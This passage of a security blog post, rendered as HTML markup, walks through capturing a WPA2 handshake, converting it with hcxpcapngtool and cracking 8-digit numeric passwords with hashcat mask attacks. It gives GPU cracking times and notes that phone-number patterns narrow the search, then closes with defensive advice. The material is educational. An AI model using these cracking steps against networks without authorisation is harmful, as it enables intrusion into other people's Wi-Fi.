+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">wireshark dump-01.cap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-18.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-18_hu1878145799130705105.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-18_hu10023674089199996956.png 1024w"
+loading="lazy"
+alt="Dump is filtered to only display EAPOL data"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;p>&lt;code>EAPOL&lt;/code> is a part of the Wireshark filter which makes it easy to find the relevant authentication packets. You should have seen this keyword on the previous step, indicating that someone has connected to network. We can extract only &lt;code>EAPOL&lt;/code> handshakes to make the file size smaller or convert(next step) the file without modifying it, which works in mostly every way, if you don&amp;rsquo;t do long scans (&amp;gt; 5 mins)&lt;/p>
+&lt;h3 id="8-convert-captured-file-into-a-format-for-our-next-tool">8. Convert captured file into a format for our next tool
+&lt;/h3>&lt;p>Using the official converter provided by the Hashcat team, the capture file needs to be converted into a suitable format. Online tool can be used from &lt;a class="link" href="https://hashcat.net/cap2hashcat/" target="_blank" rel="noopener"
+>here&lt;/a> or using the CLI&lt;/p>
+&lt;p>Make sure you restart NetworkManager to gain Internet access back, otherwise you will not be able to download the package&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo systemctl restart NetworkManager
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If you want to use CLI tool over a simple website, then you have to install &lt;code>hcxtools&lt;/code> package which contains mostly everything from Hashcat team.&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-19.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-19_hu89482103143053841.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-19_hu12146795507042383071.png 1024w"
+loading="lazy"
+alt="Install hcxtools to access the hcxpcapngtool binary"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt install hcxtools
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hcxpcapngtool -o dump.hc22000 dump-01.cap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After execution you should see something like that&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-20.png"
+width="3680"
+height="2382"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-20_hu16658786979853189348.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-20_hu9966649660890107595.png 1024w"
+loading="lazy"
+alt="The tool successfully detected EAPOL and converted to suitable format"
+class="gallery-image"
+data-flex-grow="154"
+data-flex-basis="370px"
+>
+&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-21.png"
+width="3680"
+height="2382"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-21_hu140817003765395801.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-21_hu10415238519897099765.png 1024w"
+loading="lazy"
+alt="We are seeing success message and good to go"
+class="gallery-image"
+data-flex-grow="154"
+data-flex-basis="370px"
+>&lt;/p>
+&lt;h3 id="9-decoding-captured-files-hash-to-real-password">9. Decoding captured file&amp;rsquo;s hash to real password
+&lt;/h3>&lt;p>Finally, let&amp;rsquo;s do a password strength test using Hashcat. I will be testing this on my Macbook Pro 16 2021 with M1 Pro GPU and i7-8700 + RX 6600 XT using macOS Sonoma (Hackintosh)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">22000&lt;/span> dump.hc22000 -a &lt;span class="m">3&lt;/span> &lt;span class="s2">&amp;#34;?d?d?d?d?d?d?d?d&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>where:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>-m 22000&lt;/code> specifies the WPA-PBKDF2-PMKID+EAPOL algorithm.&lt;/li>
+&lt;li>&lt;code>-a 3&lt;/code> indicates a mask attack.&lt;/li>
+&lt;li>&lt;code>&amp;quot;?d&amp;quot;&lt;/code> represents a digit.&lt;/li>
+&lt;/ul>
+&lt;h4 id="time-to-crack-the-hash">Time to crack the hash
+&lt;/h4>&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: left">&lt;strong>GPU&lt;/strong>&lt;/th>
+&lt;th style="text-align: left">&lt;strong>Cracking Time (8-digit numerical password)&lt;/strong>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: left">AMD RX 6600 XT&lt;/td>
+&lt;td style="text-align: left">~5 minutes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">NVIDIA GTX 1660 Ti&lt;/td>
+&lt;td style="text-align: left">~10 minutes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">Apple M1 Pro GPU&lt;/td>
+&lt;td style="text-align: left">~12 minutes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: left">Apple M1 GPU&lt;/td>
+&lt;td style="text-align: left">~40 minutes&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-m1-pro-1.png"
+width="2264"
+height="1568"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-m1-pro-1_hu17361306262619117649.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-m1-pro-1_hu12832115152496732285.png 1024w"
+loading="lazy"
+alt="Launching with M1 Pro GPU"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>
+&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-rx-6600-xt-1.png"
+width="1314"
+height="729"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-rx-6600-xt-1_hu7771694282553237607.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-rx-6600-xt-1_hu10523629210333159372.png 1024w"
+loading="lazy"
+alt="Launching with RX 6600 XT"
+class="gallery-image"
+data-flex-grow="180"
+data-flex-basis="432px"
+>&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-m1-pro-2.png"
+width="2264"
+height="1568"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-m1-pro-2_hu12351433808095157305.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-m1-pro-2_hu7775117869194839334.png 1024w"
+loading="lazy"
+alt="Estimated time is 15 minutes to crack"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>
+&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-rx-6600-xt-2.png"
+width="1314"
+height="729"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-rx-6600-xt-2_hu3774173748362179723.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/gpu-rx-6600-xt-2_hu5308090431896243026.png 1024w"
+loading="lazy"
+alt="Estimated time is 6 minutes to crack"
+class="gallery-image"
+data-flex-grow="180"
+data-flex-basis="432px"
+>&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/cracked-m1-pro.png"
+width="2264"
+height="1568"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/cracked-m1-pro_hu1253132177957613558.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/cracked-m1-pro_hu9298807276731764611.png 1024w"
+loading="lazy"
+alt="Cracked with M1 Pro"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+>
+&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/cracked-rx-6600-xt.png"
+width="1314"
+height="729"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/cracked-rx-6600-xt_hu9515341434614964290.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/cracked-rx-6600-xt_hu14543645361469547616.png 1024w"
+loading="lazy"
+alt="Cracked with RX 6600 XT"
+class="gallery-image"
+data-flex-grow="180"
+data-flex-basis="432px"
+>&lt;/p>
+&lt;p>In order to test the strength of Wi-Fi passwords, many users rely on simple or default passwords such as 8-digit numerical combinations. Added to the defaults above, many users use their phone numbers as Wi-Fi passwords, and these in turn also follow predictable formats, especially within certain regions.&lt;/p>
+&lt;p>For instance, a Ukrainian phone number like &lt;code>0661234567&lt;/code>, &lt;code>0951234567&lt;/code> is of a pattern already known and can be used to shrink the number of iterations during a password strength test&lt;/p>
+&lt;h3 id="10-accessing-network">10. Accessing network
+&lt;/h3>&lt;p>If the password is determined in no time, that is a clear indication of bad security. This information is valuable for the utilization of strong, complicated passwords to secure Wi-Fi networks.&lt;/p>
+&lt;h2 id="implications-and-why-most-wi-fi-networks-are-insecure">Implications and why most Wi-Fi networks are insecure
+&lt;/h2>&lt;h3 id="weak-passwords">Weak passwords
+&lt;/h3>&lt;p>Too many users assign simple, easily guessed passwords. The use of default or common passwords makes brute-force attacks successful.&lt;/p>
+&lt;h3 id="use-of-outdated-security-protocols">Use of outdated security protocols
+&lt;/h3>&lt;p>Those networks which still make use of WEP or which have WPA/WPA2 but are poorly configured remain highly susceptible to attacks. Even WPA2 may become compromised provided it is not installed correctly.&lt;/p>
+&lt;h3 id="lack-of-user-awareness">Lack of user awareness
+&lt;/h3>&lt;p>Users often are uninformed regarding Wi-Fi security and hence never change default settings. Typical person would install the router and never touch it again until it breaks. They don&amp;rsquo;t use intergrated web interface to see who is connected to network, which is a quite handy feature.&lt;/p>
+&lt;h3 id="availability-of-testing-tools">Availability of Testing Tools
+&lt;/h3>&lt;p>All of the tools utilized in this tutorial are free to download and very accessible. This means that the threshold to test network security is low, but potential abuse because of that fact is much greater.&lt;/p>
+&lt;h2 id="securing-your-wi-fi-network">Securing Your Wi-Fi Network
+&lt;/h2>&lt;h3 id="use-strong-complex-passwords">Use Strong, Complex Passwords
+&lt;/h3>&lt;p>Passwords should be long and consist of a range of letter, numeric, and special characters.&lt;/p>
+&lt;h3 id="improve-security-settings">Improve Security Settings
+&lt;/h3>&lt;p>Use WPA3 if it&amp;rsquo;s an option. Do not use anything less than WPS2 with AES encryption enabled.&lt;/p>
+&lt;h3 id="disable-wps">Disable WPS
+&lt;/h3>&lt;p>WPS can be an active vulnerability in security. We can cover this in another article, where we could discuss WPS as a potential exploit. Disabling this feature removes another vector for attack.&lt;/p>
+&lt;p>If you have a TP-LINK router, you can do this:
+Go to the router&amp;rsquo;s admin panel (typically &lt;code>192.168.0.1&lt;/code>)&lt;/p>
+&lt;ul>
+&lt;li>Log in with your credentials&lt;/li>
+&lt;li>Click on the &lt;code>Advanced&lt;/code> tab&lt;/li>
+&lt;li>Tap &lt;code>Wireless&lt;/code> and select &lt;code>WPS&lt;/code> from the menu&lt;/li>
+&lt;li>Turn that setting off&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/wps-off.png"
+width="2266"
+height="1920"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/wps-off_hu14804220364809924475.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/wps-off_hu8565643422817777829.png 1024w"
+loading="lazy"
+alt="This should be turned off"
+class="gallery-image"
+data-flex-grow="118"
+data-flex-basis="283px"
+>&lt;/p>
+&lt;h3 id="router-firmware-update">Router Firmware Update
+&lt;/h3>&lt;p>Vendors publish updates to fix vulnerabilities. Keeping the firmware updated improves security.&lt;/p>
+&lt;h3 id="monitor-connected-devices">Monitor Connected Devices
+&lt;/h3>&lt;p>Periodically &lt;strong>look&lt;/strong> and see what devices are connected to your network to find unauthorized access.&lt;/p>
+&lt;h3 id="phishing">Phishing
+&lt;/h3>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/phishing.webp"
+width="1920"
+height="1080"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/phishing_hu16727193522974883720.webp 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/phishing_hu6558097622381708648.webp 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="177"
+data-flex-basis="426px"
+>&lt;/p>
+&lt;p>Independent from the above technical weaknesses, &lt;strong>phishing&lt;/strong> remains probably one of the most persistent and effective attack methods. Phishing does not exploit directly the Wi-Fi protocols but instead targets the user to steal sensitive information, such as passwords or personal data. No matter how much network security advances, phishing attacks will always be an issue since they rely on human trust and error. This is the reason why user awareness against phishing is as crucial as any technical defense. In the long term, teaching users how to recognize phishing attempts may turn out to be the most important strategy for securing Wi-Fi networks.&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>The fact that a Wi-Fi network can be cracked and accessed so easily using tools that are widely available shows a severe security gap. In fact, through understanding these vulnerabilities, users would be aware of the steps they must take to secure their networks: from strong passwords to updated protocols and the like to increased vigilance against unauthorized access.&lt;/p>
+&lt;h2 id="references">References
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.kali.org/docs/" target="_blank" rel="noopener"
+>Kali Linux Official Documentation&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.aircrack-ng.org/documentation.html" target="_blank" rel="noopener"
+>Aircrack-ng Documentation&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://hashcat.net/wiki/" target="_blank" rel="noopener"
+>Hashcat Wiki&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank" rel="noopener"
+>Wireshark User Guide&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
